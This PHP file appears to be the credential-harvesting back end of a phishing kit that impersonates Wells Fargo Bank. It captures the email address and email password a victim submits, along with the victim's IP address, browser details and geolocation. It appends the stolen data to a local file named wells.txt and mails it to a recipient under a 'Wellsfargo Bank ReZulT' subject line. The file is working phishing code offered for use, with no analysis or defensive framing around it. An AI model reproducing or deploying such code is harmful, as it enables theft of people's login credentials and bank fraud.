<?php


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

//Getting user ip & hostname
$date =	date("D M d, Y g:i a");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getenv('REMOTE_ADDR');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");

include("grabber.php");

$message = "--------------Wellsfargo Bank Result-------------------\n";
$message .= "Email Address: ".$_POST['email']."\n";
$message .= "Email Password: ".$_POST['emailpass']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Submitted By : ".$user_ip."\n";
$message .= "Country Name : {$geoplugin->countryName}"."\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date And Time : ".$adddate."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "--------xXx--------\n";
$message .= "IP Address: $ip \n";

$fp = fopen('wells.txt', 'a');
fwrite($fp, $message);
fclose($fp);


$subject = "Wellsfargo Bank ReZulT | $ip";
$headers = "From: Wellsfargo Bank <customer@wellsfargo.com>\n";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-Type: text/plain; charset=UTF-8\n";
//$headers .= "Content-Transfer-Encoding: 8bit\n";


if(mail($recipient, $subject, $message)){ 
   
//header("Location: identify.php?&".generateRandomString(200));
}else{
	
	echo "error sending email";
	
	}


//mail($recipient, $subj, $msg,"$headers");

?>


